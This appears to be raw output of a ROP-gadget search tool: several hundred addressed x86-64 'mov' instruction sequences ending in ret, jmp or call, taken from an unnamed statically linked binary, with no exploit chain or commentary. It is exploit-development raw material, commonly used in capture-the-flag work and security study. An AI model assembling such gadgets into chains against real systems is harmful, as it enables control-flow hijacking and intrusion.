0x000000000040061f : mov esp, eax ; call 0x43a838
0x000000000046d9b9 : mov esp, eax ; mov rbp, r9 ; jmp rdx
0x00000000004716e1 : mov esp, eax ; nop dword ptr [rax + rax] ; call qword ptr [rbx]
0x0000000000477a07 : mov esp, ecx ; ret
0x0000000000499f94 : mov esp, gs ; sti ; call rax
0x0000000000475173 : mov qword ptr [r10], r8 ; ret
0x00000000004067bf : mov qword ptr [r15], rax ; jmp 0x40678a
0x000000000040693e : mov qword ptr [r15], rax ; jmp 0x40690a
0x000000000042a8c0 : mov qword ptr [r9 - 8], rcx ; ret
0x000000000043dbc0 : mov qword ptr [rax + 0x10], rcx ; mov qword ptr [rax + 8], rdx ; ret
0x000000000045daf8 : mov qword ptr [rax + 0x10], rdx ; mov qword ptr [rax + 0x40], rcx ; ret
0x000000000045db38 : mov qword ptr [rax + 0x10], rsi ; mov qword ptr [rax + 0x40], rcx ; ret
0x000000000045e0c7 : mov qword ptr [rax + 0x18], rdx ; mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x000000000045dafc : mov qword ptr [rax + 0x40], rcx ; ret
0x000000000045e149 : mov qword ptr [rax + 0x48], 0 ; pop rbx ; ret
0x000000000040ddb4 : mov qword ptr [rax + 8], 0 ; ret
0x000000000043dbc4 : mov qword ptr [rax + 8], rdx ; ret
0x000000000046f99c : mov qword ptr [rax], rdi ; pop rbx ; ret
0x000000000046f8ec : mov qword ptr [rax], rdx ; add rsp, 8 ; ret
0x000000000046d63a : mov qword ptr [rax], rdx ; pop rbx ; ret
0x0000000000477521 : mov qword ptr [rax], rdx ; ret
0x000000000045e75a : mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x0000000000468b70 : mov qword ptr [rbp - 0xe0], r11 ; call r10
0x0000000000468170 : mov qword ptr [rbp - 0xf8], r11 ; call r10
0x0000000000448501 : mov qword ptr [rbx + 0x10], 0 ; pop rbx ; ret
0x000000000040a5c6 : mov qword ptr [rbx + 0x10], rax ; mov rax, rbx ; pop rbx ; ret
0x000000000046d52d : mov qword ptr [rbx + 0x10], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x000000000040ad7e : mov qword ptr [rbx + 0x10], rax ; xor eax, eax ; pop rbx ; ret
0x000000000046b41d : mov qword ptr [rbx + 0x10], rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000046d232 : mov qword ptr [rbx + 0x18], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x0000000000472d44 : mov qword ptr [rbx + 0x18], rax ; pop rbx ; ret
0x0000000000472df8 : mov qword ptr [rbx + 0x20], rax ; pop rbx ; ret
0x000000000040d430 : mov qword ptr [rbx + 0x50], 0 ; pop rbx ; ret
0x0000000000470152 : mov qword ptr [rbx], rax ; add rsp, 0x10 ; pop rbx ; ret
0x0000000000474968 : mov qword ptr [rbx], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x0000000000415baf : mov qword ptr [rbx], rax ; xor eax, eax ; pop rbx ; ret
0x000000000040829d : mov qword ptr [rcx + 0x130], rdx ; ret
0x000000000046e00e : mov qword ptr [rdi + 0x10], r9 ; ret
0x0000000000436d3c : mov qword ptr [rdi + 0x10], rcx ; lea rax, [rdi + 0x17] ; ret
0x00000000004366ac : mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x000000000043668c : mov qword ptr [rdi + 0x10], rcx ; ret
0x00000000004366ef : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x000000000043670f : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x00000000004366d0 : mov qword ptr [rdi + 0x10], rdx ; mov word ptr [rdi + 0x18], cx ; ret
0x000000000040d312 : mov qword ptr [rdi + 0x18], rax ; mov qword ptr [rdi + 8], rax ; ret
0x000000000043dc0e : mov qword ptr [rdi + 0x20], rdx ; mov byte ptr [rdi + 0x28], 1 ; ret
0x000000000043dc30 : mov qword ptr [rdi + 0x20], rsi ; ret
0x0000000000467214 : mov qword ptr [rdi + 0x300], rax ; ret
0x00000000004671e6 : mov qword ptr [rdi + 0x308], rax ; ret
0x000000000040d342 : mov qword ptr [rdi + 0x48], rdx ; mov qword ptr [rdi + 8], rax ; ret
0x000000000040fa78 : mov qword ptr [rdi + 0x60], rcx ; ret
0x000000000040fb05 : mov qword ptr [rdi + 0x880], rax ; ret
0x0000000000477560 : mov qword ptr [rdi + 0x98], rsi ; ret
0x0000000000436cfc : mov qword ptr [rdi + 0xe], rcx ; lea rax, [rdi + 0x15] ; ret
0x000000000043664c : mov qword ptr [rdi + 0xe], rcx ; ret
0x0000000000436d1c : mov qword ptr [rdi + 0xf], rcx ; lea rax, [rdi + 0x16] ; ret
0x000000000043666c : mov qword ptr [rdi + 0xf], rcx ; ret
0x00000000004278a7 : mov qword ptr [rdi + 1], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000427837 : mov qword ptr [rdi + 2], rdx ; mov qword ptr [rdi], rcx ; ret
0x00000000004277c7 : mov qword ptr [rdi + 3], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000427757 : mov qword ptr [rdi + 4], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000436bfa : mov qword ptr [rdi + 5], rdx ; lea rax, [rdi + 0xc] ; ret
0x00000000004276e7 : mov qword ptr [rdi + 5], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000043659a : mov qword ptr [rdi + 5], rdx ; ret
0x0000000000436c1a : mov qword ptr [rdi + 6], rdx ; lea rax, [rdi + 0xd] ; ret
0x0000000000427677 : mov qword ptr [rdi + 6], rdx ; mov qword ptr [rdi], rcx ; ret
0x00000000004365aa : mov qword ptr [rdi + 6], rdx ; ret
0x0000000000436c3a : mov qword ptr [rdi + 7], rdx ; lea rax, [rdi + 0xe] ; ret
0x0000000000427607 : mov qword ptr [rdi + 7], rdx ; mov qword ptr [rdi], rcx ; ret
0x00000000004365ba : mov qword ptr [rdi + 7], rdx ; ret
0x000000000046ef53 : mov qword ptr [rdi + 8], r10 ; mov eax, ecx ; adc eax, eax ; ret
0x000000000046df93 : mov qword ptr [rdi + 8], r9 ; ret
0x000000000046f29d : mov qword ptr [rdi + 8], rax ; mov eax, 2 ; ret
0x000000000040d316 : mov qword ptr [rdi + 8], rax ; ret
0x000000000043a06a : mov qword ptr [rdi + rdx - 8], rcx ; mov qword ptr [rdi], rcx ; ret
0x00000000004392f6 : mov qword ptr [rdi + rdx - 8], rcx ; mov qword ptr [rdi], rsi ; ret
0x000000000047750b : mov qword ptr [rdi + rsi*8], rdx ; ret
0x0000000000421514 : mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000421552 : mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000046defe : mov qword ptr [rdi - 0x10], r9 ; ret
0x000000000042189b : mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004270b7 : mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421a7b : mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000427037 : mov qword ptr [rdi - 0xb], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421c6b : mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000426fb7 : mov qword ptr [rdi - 0xc], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421e3c : mov qword ptr [rdi - 0xd], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000426f28 : mov qword ptr [rdi - 0xd], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000042203c : mov qword ptr [rdi - 0xe], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000426e98 : mov qword ptr [rdi - 0xe], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000042223c : mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000426e08 : mov qword ptr [rdi - 0xf], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000046de89 : mov qword ptr [rdi - 8], r9 ; ret
0x0000000000421518 : mov qword ptr [rdi - 8], rcx ; ret
0x0000000000421556 : mov qword ptr [rdi - 8], rdx ; ret
0x00000000004216cb : mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004217c7 : mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000421713 : mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000427137 : mov qword ptr [rdi - 9], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000455ec9 : mov qword ptr [rdi], r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046de58 : mov qword ptr [rdi], r9 ; ret
0x0000000000436b86 : mov qword ptr [rdi], rcx ; lea rax, [rdi + 8] ; ret
0x0000000000436576 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; ret
0x0000000000436586 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; ret
0x0000000000436597 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 5], rdx ; ret
0x00000000004365a7 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 6], rdx ; ret
0x00000000004365b7 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 7], rdx ; ret
0x0000000000436567 : mov qword ptr [rdi], rcx ; mov word ptr [rdi + 8], dx ; ret
0x000000000042760b : mov qword ptr [rdi], rcx ; ret
0x000000000043a1ee : mov qword ptr [rdi], rcx ; vzeroupper ; ret
0x0000000000436b73 : mov qword ptr [rdi], rdx ; lea rax, [rdi + 7] ; ret
0x0000000000427913 : mov qword ptr [rdi], rdx ; ret
0x000000000042a8bd : mov qword ptr [rdi], rsi ; mov qword ptr [r9 - 8], rcx ; ret
0x00000000004392fb : mov qword ptr [rdi], rsi ; ret
0x000000000040a644 : mov qword ptr [rdx + 0x130], rdi ; pop rbx ; ret
0x000000000043611a : mov qword ptr [rdx + 5], rax ; lea rax, [rdx + 0xc] ; ret
0x000000000043490a : mov qword ptr [rdx + 5], rax ; mov rax, rdi ; ret
0x000000000043613a : mov qword ptr [rdx + 6], rax ; lea rax, [rdx + 0xd] ; ret
0x000000000043492a : mov qword ptr [rdx + 6], rax ; mov rax, rdi ; ret
0x000000000043615a : mov qword ptr [rdx + 7], rax ; lea rax, [rdx + 0xe] ; ret
0x000000000043494a : mov qword ptr [rdx + 7], rax ; mov rax, rdi ; ret
0x0000000000435fea : mov qword ptr [rdx + 8], rax ; lea rax, [rdx + 0xf] ; ret
0x000000000043483a : mov qword ptr [rdx + 8], rax ; mov rax, rdi ; ret
0x000000000040ea7f : mov qword ptr [rdx + 8], rax ; xor eax, eax ; ret
0x0000000000435f93 : mov qword ptr [rdx], rax ; lea rax, [rdx + 7] ; ret
0x00000000004347e3 : mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x000000000046f97c : mov qword ptr [rdx], rax ; pop rbx ; ret
0x000000000040e9e7 : mov qword ptr [rdx], rax ; ret
0x0000000000415e6b : mov qword ptr [rdx], rbx ; mov rax, r10 ; pop rbx ; ret
0x000000000043c9c4 : mov qword ptr [rdx], rdi ; pop rbx ; pop rbp ; ret
0x000000000046f4b7 : mov qword ptr [rip + 0x234baa], rax ; ret
0x000000000046ad34 : mov qword ptr [rip + 0x239675], rax ; ret
0x00000000004142c5 : mov qword ptr [rip + 0x28d594], rax ; ret
0x0000000000410a7b : mov qword ptr [rip + 0x290dde], rax ; ret
0x000000000040f693 : mov qword ptr [rip + 0x2921ae], rax ; ret
0x000000000040f683 : mov qword ptr [rip + 0x2921b6], rax ; ret
0x000000000040f671 : mov qword ptr [rip + 0x2921b8], rdx ; ret
0x000000000040f633 : mov qword ptr [rip + 0x2921be], rax ; ret
0x000000000040f60d : mov qword ptr [rip + 0x2921cc], rax ; ret
0x000000000040f623 : mov qword ptr [rip + 0x2921d6], rax ; ret
0x000000000040f5dd : mov qword ptr [rip + 0x292204], rax ; ret
0x000000000040e97a : mov qword ptr [rsi + 0x60], rbx ; add rsp, 0x10 ; pop rbx ; ret
0x0000000000464ab0 : mov qword ptr [rsi], -1 ; xor eax, eax ; ret
0x000000000046aea1 : mov qword ptr [rsi], rax ; ret
0x000000000040f811 : mov qword ptr [rsi], rcx ; ret
0x000000000046a1ea : mov qword ptr [rsi], rdi ; mov rax, r8 ; pop rbx ; ret
0x0000000000406732 : mov qword ptr [rsp + 0x20], r10 ; call rax
0x00000000004123f3 : mov qword ptr [rsp + 8], rax ; call rcx
0x0000000000412370 : mov qword ptr [rsp + 8], rax ; call rsi
0x000000000040907d : mov qword ptr [rsp + 8], rcx ; mov rdi, r15 ; call rax
0x000000000040b301 : mov qword ptr [rsp], rcx ; mov rdi, rbx ; call rax
0x000000000044a335 : mov qword ptr fs:[rdx], rax ; ret
0x00000000004392f5 : mov qword ptr ss:[rdi + rdx - 8], rcx ; mov qword ptr [rdi], rsi ; ret
0x000000000048f89d : mov r10d, 0xcac982a4 ; call 0xffffffffaf0b971f
0x0000000000400755 : mov r12, rax ; call 0x43a3f9
0x000000000040061e : mov r12, rax ; call 0x43a839
0x00000000004716e0 : mov r12, rax ; nop dword ptr [rax + rax] ; call qword ptr [rbx]
0x000000000047787c : mov r14, qword ptr [rbp - 0x10] ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x0000000000477880 : mov r15, qword ptr [rbp - 8] ; leave ; ret
0x0000000000475170 : mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x000000000044022a : mov r9, r13 ; call rbx
0x0000000000460ab4 : mov r9, r14 ; call rbx
0x000000000040df60 : mov rax, -1 ; ret
0x00000000004610d0 : mov rax, 1 ; ret
0x00000000004610e0 : mov rax, 2 ; ret
0x00000000004610f0 : mov rax, 3 ; ret
0x0000000000461100 : mov rax, 4 ; ret
0x0000000000461110 : mov rax, 5 ; ret
0x0000000000461120 : mov rax, 6 ; ret
0x0000000000461130 : mov rax, 7 ; ret
0x0000000000468735 : mov rax, qword ptr [r15 + 0x10] ; add rax, qword ptr [r14] ; call rax
0x0000000000409610 : mov rax, qword ptr [rax + 0x20] ; jmp rax
0x000000000045e813 : mov rax, qword ptr [rax + 0x4c] ; ret
0x000000000046d0f0 : mov rax, qword ptr [rax + 8] ; ret
0x0000000000448dd6 : mov rax, qword ptr [rax + rbp*8] ; test rax, rax ; je 0x448dea ; call rax
0x000000000047a6cf : mov rax, qword ptr [rax + rbp*8] ; test rax, rax ; je 0x47a6e3 ; call rax
0x000000000044a34e : mov rax, qword ptr [rax + rdi*8 + 0x80] ; ret
0x000000000044f200 : mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000459c7f : mov rax, qword ptr [rax + rsi*8] ; jmp rax
0x00000000004774b2 : mov rax, qword ptr [rax] ; ret
0x0000000000467e80 : mov rax, qword ptr [rbx + 0x10] ; add rax, qword ptr [r14] ; call rax
0x000000000040d47c : mov rax, qword ptr [rbx + 0x18] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x000000000046f998 : mov rax, qword ptr [rbx + 0x18] ; mov qword ptr [rax], rdi ; pop rbx ; ret
0x000000000040d9d8 : mov rax, qword ptr [rbx + 0x40] ; add rsp, 0x20 ; pop rbx ; jmp rax
0x0000000000471703 : mov rax, qword ptr [rbx] ; add rax, qword ptr [rdx + 8] ; call rax
0x00000000004347e0 : mov rax, qword ptr [rcx] ; mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x000000000047a98c : mov rax, qword ptr [rdi + 0x20] ; test rax, rax ; je 0x47a9a5 ; call rax
0x000000000045e810 : mov rax, qword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x000000000040ed00 : mov rax, qword ptr [rdi + 0x68] ; ret
0x00000000004774e0 : mov rax, qword ptr [rdi + 0x90] ; ret
0x0000000000477530 : mov rax, qword ptr [rdi + 0x98] ; ret
0x0000000000477570 : mov rax, qword ptr [rdi + 0xa0] ; ret
0x00000000004775d0 : mov rax, qword ptr [rdi + 0xa8] ; ret
0x00000000004775c0 : mov rax, qword ptr [rdi + 0xb0] ; ret
0x0000000000477580 : mov rax, qword ptr [rdi + 0xb8] ; ret
0x0000000000472660 : mov rax, qword ptr [rdi] ; cmp rax, rsi ; je 0x472679 ; ret
0x000000000040f5f0 : mov rax, qword ptr [rdi] ; mov dword ptr [rip + 0x29479b], eax ; ret
0x000000000040e9e4 : mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x000000000040e9d0 : mov rax, qword ptr [rdx] ; test rax, rax ; jne 0x40e9d1 ; ret
0x000000000046ae29 : mov rax, qword ptr [rip + 0x239580] ; ret
0x0000000000447d00 : mov rax, qword ptr [rip + 0x25c171] ; ret
0x00000000004403f0 : mov rax, qword ptr [rip + 0x264531] ; ret
0x000000000040ece0 : mov rax, qword ptr [rip + 0x292439] ; ret
0x0000000000478421 : mov rax, qword ptr [rsi + 0x10] ; ret
0x00000000004752b0 : mov rax, qword ptr [rsi + 0xa8] ; ret
0x0000000000475283 : mov rax, qword ptr [rsi + 0xb0] ; ret
0x00000000004752a0 : mov rax, qword ptr [rsi + 0xb8] ; ret
0x0000000000478440 : mov rax, qword ptr [rsi + 8] ; ret
0x000000000044ee63 : mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x00000000004775a5 : mov rax, qword ptr [rsp + 0x10] ; add rsp, 0x28 ; ret
0x00000000004010e2 : mov rax, qword ptr [rsp + 0x18] ; call rax
0x0000000000444d92 : mov rax, qword ptr [rsp + 0x20] ; call rax
0x00000000004067a8 : mov rax, qword ptr [rsp + 8] ; call rax
0x0000000000474d19 : mov rax, qword ptr [rsp] ; add rsp, 0x38 ; ret
0x0000000000415e6e : mov rax, r10 ; pop rbx ; ret
0x0000000000401d06 : mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046b5d1 : mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000043cc0d : mov rax, r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004109be : mov rax, r8 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000415122 : mov rax, r8 ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000414faa : mov rax, r8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046a1ed : mov rax, r8 ; pop rbx ; ret
0x0000000000460300 : mov rax, r8 ; vzeroupper ; ret
0x0000000000456236 : mov rax, r9 ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000045617b : mov rax, r9 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000469e82 : mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000401ab0 : mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004776da : mov rax, rbp ; pop rbx ; pop rbp ; ret
0x000000000040c011 : mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000040bf44 : mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040fc53 : mov rax, rbx ; pop rbx ; pop rbp ; ret
0x000000000040a5ca : mov rax, rbx ; pop rbx ; ret
0x000000000040a4c2 : mov rax, rdi ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000410283 : mov rax, rdi ; pop rbp ; pop r12 ; ret
0x000000000040a4f3 : mov rax, rdi ; ret
0x0000000000414751 : mov rax, rdx ; pop rbp ; pop r12 ; ret
0x00000000004619aa : mov rax, rdx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000414436 : mov rax, rdx ; pop rbx ; pop rbp ; ret
0x000000000043a575 : mov rax, rdx ; pop rbx ; ret
0x00000000004331a8 : mov rax, rdx ; ret
0x000000000046f363 : mov rax, rsi ; ret
0x0000000000477a02 : mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x0000000000478c49 : mov rbp, qword ptr [rsp + 8] ; jmp 0x478c69
0x000000000046d9bb : mov rbp, r9 ; jmp rdx
0x000000000045cec8 : mov rbp, rax ; jmp 0x45ce93
0x0000000000449d45 : mov rbx, rdi ; test rax, rax ; je 0x449d57 ; call rax
0x0000000000436550 : mov rcx, qword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x000000000046d1e6 : mov rcx, qword ptr [rsp + 0x40] ; add rsp, 0x48 ; jmp qword ptr [rax]
0x000000000046d174 : mov rcx, qword ptr [rsp + 0x40] ; add rsp, 0x58 ; jmp qword ptr [rax]
0x000000000045ee20 : mov rcx, rax ; jmp 0x45edec
0x00000000004392d1 : mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000406f23 : mov rdi, qword ptr [rax + 0x20] ; call rdx
0x000000000044c20a : mov rdi, qword ptr [rbp - 0x8a8] ; call rax
0x0000000000456acc : mov rdi, qword ptr [rbp - 0x8d0] ; call rax
0x00000000004067a4 : mov rdi, qword ptr [rbp] ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000047915e : mov rdi, qword ptr [rsp + 0x10] ; call r14
0x000000000044254f : mov rdi, qword ptr [rsp + 0x20] ; call r15
0x0000000000443789 : mov rdi, qword ptr [rsp + 0x30] ; call r14
0x000000000044361e : mov rdi, qword ptr [rsp + 0x30] ; call r15
0x0000000000442eee : mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x00000000004428fa : mov rdi, qword ptr [rsp + 0x38] ; call r14
0x00000000004445d5 : mov rdi, qword ptr [rsp + 0x38] ; call r15
0x000000000044524a : mov rdi, qword ptr [rsp + 0x40] ; call r15
0x0000000000446133 : mov rdi, qword ptr [rsp + 0x48] ; call r14
0x00000000004439e3 : mov rdi, qword ptr [rsp + 0x48] ; call r15
0x000000000044a83b : mov rdi, qword ptr [rsp + 8] ; call r12
0x000000000040d4a5 : mov rdi, qword ptr [rsp] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x000000000047804b : mov rdi, qword ptr [rsp] ; mov rdx, qword ptr [rbp] ; call r12
0x0000000000477f53 : mov rdi, r12 ; call r15
0x000000000045e89f : mov rdi, r12 ; call rbx
0x0000000000478f3b : mov rdi, r13 ; call r14
0x000000000043cc99 : mov rdi, r13 ; mov rsi, qword ptr [rax] ; call r14
0x0000000000413f43 : mov rdi, r14 ; call 0x4101d5
0x000000000044a866 : mov rdi, r14 ; call r12
0x0000000000440bca : mov rdi, r14 ; mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x0000000000414dae : mov rdi, r15 ; call 0x411055
0x000000000045eb77 : mov rdi, r15 ; call r12
0x0000000000409082 : mov rdi, r15 ; call rax
0x000000000044a933 : mov rdi, r15 ; mov rdx, r13 ; call r12
0x00000000004490e8 : mov rdi, rax ; mov byte ptr [rdi], 0 ; pop rbx ; pop r14 ; ret
0x000000000044a827 : mov rdi, rbp ; call r12
0x0000000000415135 : mov rdi, rbp ; call rax
0x0000000000460960 : mov rdi, rbp ; call rbx
0x0000000000460ab1 : mov rdi, rbp ; mov r9, r14 ; call rbx
0x00000000004067f8 : mov rdi, rbp ; mov rax, qword ptr [rsp + 8] ; call rax
0x00000000004486ca : mov rdi, rbx ; call 0x414965
0x0000000000447cb9 : mov rdi, rbx ; call r12
0x00000000004405d8 : mov rdi, rbx ; call r15
0x000000000040b305 : mov rdi, rbx ; call rax
0x000000000040afb9 : mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x000000000045deae : mov rdi, rbx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x000000000040b029 : mov rdi, rbx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; jmp rax
0x000000000041340e : mov rdi, rdx ; pop rbx ; jmp 0x40f6a6
0x0000000000477188 : mov rdx, qword ptr [r12] ; mov edi, 1 ; call rax
0x0000000000478f38 : mov rdx, qword ptr [r15] ; mov rdi, r13 ; call r14
0x000000000047804f : mov rdx, qword ptr [rbp] ; call r12
0x000000000046f978 : mov rdx, qword ptr [rbx + 0x18] ; mov qword ptr [rdx], rax ; pop rbx ; ret
0x000000000046f98c : mov rdx, qword ptr [rdi + 0x30] ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x0000000000421680 : mov rdx, qword ptr [rsi - 8] ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000427910 : mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x000000000046d898 : mov rdx, qword ptr [rsp + 0x10] ; call rdx
0x0000000000416274 : mov rdx, qword ptr [rsp + 0x18] ; jmp 0x416244
0x000000000044a936 : mov rdx, r13 ; call r12
0x00000000004741c4 : mov rdx, r13 ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x0000000000474060 : mov rdx, r13 ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rbx]
0x0000000000474020 : mov rdx, r13 ; mov rsi, r12 ; mov edi, ebp ; call rax
0x000000000046253a : mov rdx, rax ; jmp 0x462523
0x0000000000439f97 : mov rdx, rdi ; rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x0000000000478004 : mov rsi, qword ptr [r14] ; call r12
0x000000000047915b : mov rsi, qword ptr [r15] ; mov rdi, qword ptr [rsp + 0x10] ; call r14
0x0000000000448cdb : mov rsi, qword ptr [rax + r15*8] ; test rsi, rsi ; je 0x448cef ; call rsi
0x000000000043cc9c : mov rsi, qword ptr [rax] ; call r14
0x0000000000440bcd : mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x000000000044ab4d : mov rsi, qword ptr [rsp + 0x10] ; mov rdi, rbp ; call r12
0x0000000000440225 : mov rsi, qword ptr [rsp + 0x18] ; mov r9, r13 ; call rbx
0x0000000000415130 : mov rsi, qword ptr [rsp + 0x28] ; mov rdi, rbp ; call rax
0x00000000004741c7 : mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x0000000000474063 : mov rsi, r12 ; mov edi, ebp ; call qword ptr [rbx]
0x0000000000474023 : mov rsi, r12 ; mov edi, ebp ; call rax
0x0000000000413f40 : mov rsi, r12 ; mov rdi, r14 ; call 0x4101d8
0x0000000000414dab : mov rsi, r12 ; mov rdi, r15 ; call 0x411058
0x0000000000453165 : mov rsi, r13 ; mov rdi, rbx ; call rax
0x0000000000477f50 : mov rsi, r14 ; mov rdi, r12 ; call r15
0x000000000046f704 : mov rsi, rax ; repe cmpsb byte ptr [rsi], byte ptr [rdi] ; jne 0x46f718 ; ret
0x000000000044a838 : mov rsi, rbp ; mov rdi, qword ptr [rsp + 8] ; call r12
0x000000000044a863 : mov rsi, rbp ; mov rdi, r14 ; call r12
0x000000000044a9a6 : mov rsi, rbp ; mov rdi, rbx ; call r12
0x000000000044a87e : mov rsi, rbx ; mov rdi, rbp ; call r12
0x000000000041340b : mov rsi, rbx ; mov rdi, rdx ; pop rbx ; jmp 0x40f6a9
0x0000000000477ef9 : mov rsi, rdi ; mov edi, 1 ; jmp rax
0x000000000046d9b8 : mov rsp, r8 ; mov rbp, r9 ; jmp rdx
0x0000000000477a06 : mov rsp, rcx ; ret
0x000000000042a8e5 : mov word ptr [r9 - 2], cx ; ret
0x0000000000436c7c : mov word ptr [rdi + 0x10], cx ; lea rax, [rdi + 0x11] ; ret
0x00000000004365ec : mov word ptr [rdi + 0x10], cx ; ret
0x0000000000436d84 : mov word ptr [rdi + 0x18], cx ; lea rax, [rdi + 0x19] ; ret
0x00000000004366d4 : mov word ptr [rdi + 0x18], cx ; ret
0x0000000000427b47 : mov word ptr [rdi + 1], dx ; mov word ptr [rdi], cx ; ret
0x0000000000436b48 : mov word ptr [rdi + 4], dx ; lea rax, [rdi + 5] ; ret
0x0000000000436528 : mov word ptr [rdi + 4], dx ; ret
0x0000000000436b9a : mov word ptr [rdi + 8], dx ; lea rax, [rdi + 9] ; ret
0x000000000043656a : mov word ptr [rdi + 8], dx ; ret
0x000000000043a07a : mov word ptr [rdi + rdx - 2], cx ; mov word ptr [rdi], cx ; ret
0x0000000000439314 : mov word ptr [rdi + rdx - 2], cx ; mov word ptr [rdi], si ; ret
0x0000000000421c1c : mov word ptr [rdi - 2], cx ; ret
0x0000000000421a34 : mov word ptr [rdi - 2], dx ; ret
0x0000000000421c18 : mov word ptr [rdi - 3], dx ; mov word ptr [rdi - 2], cx ; ret
0x00000000004364f3 : mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x0000000000439052 : mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x0000000000427b4b : mov word ptr [rdi], cx ; ret
0x000000000043a204 : mov word ptr [rdi], cx ; vzeroupper ; ret
0x0000000000436b03 : mov word ptr [rdi], dx ; lea rax, [rdi + 1] ; ret
0x0000000000427bb3 : mov word ptr [rdi], dx ; ret
0x000000000042a8e2 : mov word ptr [rdi], si ; mov word ptr [r9 - 2], cx ; ret
0x0000000000439319 : mov word ptr [rdi], si ; ret
0x0000000000436068 : mov word ptr [rdx + 4], ax ; lea rax, [rdx + 5] ; ret
0x00000000004348a8 : mov word ptr [rdx + 4], ax ; mov rax, rdi ; ret
0x0000000000436013 : mov word ptr [rdx], ax ; lea rax, [rdx + 1] ; ret
0x0000000000434863 : mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x0000000000439055 : mov word ptr [rsi - 2], cx ; ret
